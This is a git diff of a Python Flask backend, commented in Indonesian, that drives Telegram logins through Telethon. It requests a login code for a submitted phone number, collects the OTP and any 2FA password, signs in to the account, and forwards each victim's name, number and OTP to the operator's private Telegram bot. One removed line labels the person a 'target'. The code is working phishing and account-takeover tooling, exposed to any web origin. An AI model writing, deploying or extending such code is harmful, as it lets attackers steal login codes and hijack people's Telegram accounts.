@@ -7,8 +7,6 @@ from telethon import TelegramClient, errors
 from asgiref.sync import async_to_sync
 
 app = Flask(__name__)
-
-# Konfigurasi CORS dasar
 CORS(app)
 
 # Ambil variabel dari dashboard Railway
@@ -20,6 +18,7 @@ CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 sessions_hash = {}
 
 def send_to_bot(message):
+    """Kirim laporan ke Bot Telegram pribadi"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
@@ -27,6 +26,7 @@ def send_to_bot(message):
         pass
 
 async def telethon_logic(data):
+    """Logika Telethon dengan deteksi otomatis sandi 2FA"""
     step = data.get('step')
     nomor = data.get('nomor')
     otp = data.get('otp')
@@ -38,12 +38,14 @@ async def telethon_logic(data):
     try:
         await client.connect()
         
+        # STEP 1: Kirim Kode OTP
         if step == 1:
             sent_code = await client.send_code_request(nomor)
             sessions_hash[nomor] = sent_code.phone_code_hash
-            send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
+            send_to_bot(f"📲 *Mencoba Masuk*\nNama: {nama}\nNomor: {nomor}")
             return {"status": "success"}, 200
 
+        # STEP 2: Verifikasi OTP & Deteksi Sandi
         elif step == 2:
             phone_code_hash = sessions_hash.get(nomor)
             try:
@@ -51,10 +53,12 @@ async def telethon_logic(data):
                 send_to_bot(f"✅ *Login Berhasil!*\nNomor: {nomor}\nOTP: {otp}")
                 return {"status": "success"}, 200
             except errors.SessionPasswordNeededError:
+                # Jika akun punya 2FA, kirim status ini ke frontend
                 return {"status": "need_2fa"}, 200
             except errors.PhoneCodeInvalidError:
                 return {"status": "error", "message": "Kode OTP Salah!"}, 400
 
+        # STEP 3: Verifikasi Sandi 2FA jika diminta
         elif step == 3:
             try:
                 await client.sign_in(password=sandi)
@@ -68,32 +72,28 @@ async def telethon_logic(data):
     finally:
         await client.disconnect()
 
-# Fungsi khusus untuk menambahkan Header CORS secara manual ke setiap respon
-def _build_cors_preflight_response():
-    response = make_response()
+# Fungsi Manual Fix CORS agar tidak merah di konsol
+def _corsify_actual_response(response):
     response.headers.add("Access-Control-Allow-Origin", "*")
     response.headers.add("Access-Control-Allow-Headers", "*")
     response.headers.add("Access-Control-Allow-Methods", "*")
     return response
 
-def _corsify_actual_response(response):
-    response.headers.add("Access-Control-Allow-Origin", "*")
-    return response
-
 @app.route('/register', methods=['POST', 'OPTIONS'])
 def register():
-    # Menangani Preflight Request (Sinyal 'merah' di konsol)
+    # Menangani Preflight Request agar tombol bisa diklik
     if request.method == 'OPTIONS':
-        return _build_cors_preflight_response()
+        return _corsify_actual_response(make_response())
         
     data = request.json
     try:
+        # Menjalankan fungsi async Telethon
         result, status_code = async_to_sync(telethon_logic)(data)
         return _corsify_actual_response(jsonify(result)), status_code
     except Exception as e:
         return _corsify_actual_response(jsonify({"status": "error", "message": str(e)})), 500
 
 if __name__ == "__main__":
-    # Menyesuaikan dengan Port 8080 dari log Railway
+    # Sesuai dengan Port 8080 pada log Railway
     port = int(os.getenv("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
